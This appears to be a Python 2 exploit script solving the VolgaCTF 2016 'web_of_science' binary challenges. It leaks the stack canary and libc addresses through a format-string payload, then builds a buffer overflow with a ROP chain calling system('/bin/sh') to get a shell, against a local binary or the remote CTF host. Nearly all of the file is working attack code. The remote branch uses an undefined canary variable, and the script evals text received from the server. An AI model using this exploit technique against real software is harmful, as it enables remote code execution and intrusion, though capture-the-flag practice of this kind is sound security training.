#web_of_science 1 & 2 

from pxwn import *
import struct

exp = Exploit("web_of_science",64)
gadget1 = exp.rop("prdi")
gadget2 = exp.rop("prsi")
gadget3 = exp.rop("ppr")
gadget4 = exp.rop("pppr")
gadget5 = exp.rop("ppppr")
gadget6 = exp.rop("/bin/sh")
gadget7 = exp.rop("leave")
shellcode = exp.normal(1) 

#================================================
#================================================
print "=" * 30
if gadget1 != "Gadgets Not Found!":
    print "pop rdi:" + hex(gadget1)
else:
    print gadget1

"""
print "=" * 30


print "=" * 30

if gadget2 != "Gadgets Not Found!":
    for i in gadget2:
        print "pop rsi: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget2

print "=" * 30

if gadget3 != "Gadgets Not Found!":
    for i in gadget3:
        print "pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget3

print "=" * 30

print "=" * 30
if gadget4 != "Gadgets Not Found!":
    for i in gadget4:
            print "pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget4

print "=" * 30

print "=" * 30
if gadget5 != "Gadgets Not Found!":
    for i in gadget5:
        print "pop pop pop pop ret: " + hex(i.address)
        print "Gadget Name: " + i.simpleString()
else:
    print gadget5

print "=" * 30
"""


def addpaper(p,data=None,canary=None,system=None,binsh=None):
    if data == "s":
        p.recvul(">")
        p.sendl("4")
        p.recvul(":")
        p.sendl(shellcode)
    elif data == "e":
        p.recvul(">")
        p.sendl("4")
        p.recvul(":")
        p.sendl("A"*72+pk64(canary)+"B"*8+pk64(gadget1) + pk64(binsh) + pk64(system))
        #p.sendl("A"*72+pk64(cananry)+"B"*8+system)
        


    else:
        p.recvul(">")
        p.sendl(data)
        p.recvul(":")
        p.sendl("%p."*30)

        
    
def deletepaper(p,index):
    p.sendl(index)


def viewpaper(p):
    p.recvul(">")
    p.sendl("4")
    p.recvul(":")
    p.sendl("0")
    p.recvul("Abstract:")
    p.recvl()
    canary = p.recvl()[166:184]
    return canary

    


#=========================================================

local=True

if local:
    p = process("./web_of_science")
    pause()
    p.debug()
    p.recvl()
    p.sendl("Hello")
    p.recvl()
    p.recvl()
    for i in range(10):
	    buf = p.recvl()
	    buf = buf.replace(" = ?","",1).strip("\n")
	    buf = str(eval(buf))
	    print "Answer: " + buf
	    p.recvul(":")
	    p.sendl(buf)
	    p.recvl()
    #addpaper
    p.recvul(">")
    p.sendl("1")
    p.recvl()
    addpaper(p,"1")
    addpaper(p,"2")
    addpaper(p,"3")
    addpaper(p,"s")
    p.recvul(">")
    #read paper
    p.sendl("5")
    p.recvl()
    p.recvul("Abstract:")
    p.recvl()
    #leak
    buf = p.recvl()
    buf = int(buf[16:30],16)
    system = buf-0x37a3a0
    binsh = buf-0x243d05
    p.recvul(">")
    p.sendl("6")
    canary = int(viewpaper(p),16)
    print green("System: "),hex(system)
    print green("Binsh: "),hex(binsh)
    print green("Canary: "),hex(canary)
    #fucking exploit
    p.recvul(">")
    p.sendl("4")
    p.recvul(":")
    p.sendl("0")
    p.recvul(">")
    p.sendl("1")
    addpaper(p,"e",canary,system,binsh)
    p.recvul(">")
    p.sendl("6")
    p.interactive()
else:
    HOST = "webofscience.2016.volgactf.ru"
    PORT = 45678
    p = connect(HOST,PORT)
    pause()
    p.debug()
    p.recvl()
    p.sendl("Hello")
    p.recvl()
    for i in range(10):
	    buf = p.recvl()
	    buf = buf.replace(" = ?","",1).strip("\n")
	    buf = str(eval(buf))
	    print "Answer: " + buf
	    p.recvul(":")
	    p.sendl(buf)

    p.recvul(">")
    p.sendl("1")
    p.recvl()
    addpaper(p,"1")
    addpaper(p,"2")
    addpaper(p,"3")
    addpaper(p,"s")
    p.recvul(">")
    p.sendl("5")
    p.recvl()
    p.recvul("Abstract:")
    p.recvl()
    buf = p.recvl()
    buf = int(buf[145:156],16)
    print buf
    #fucking exploit
    p.recvul(">")
    p.sendl("4")
    p.recvul(":")
    p.sendl("0")
    p.recvul(">")
    p.sendl("1")
    addpaper(p,"e",canary,buf)
    p.recvul(">")
    p.sendl("6")
    p.interactive()

#=========================================================



"""
#rop works for both 1 and 2. 
#I did not realize first chall was meant to solve with shellcode but i decide to use rop which is required in web_of_science2.
#Only few difference between first and second. You still can leak using format vuln and they added the category "url" and "size" in add paper function


"""


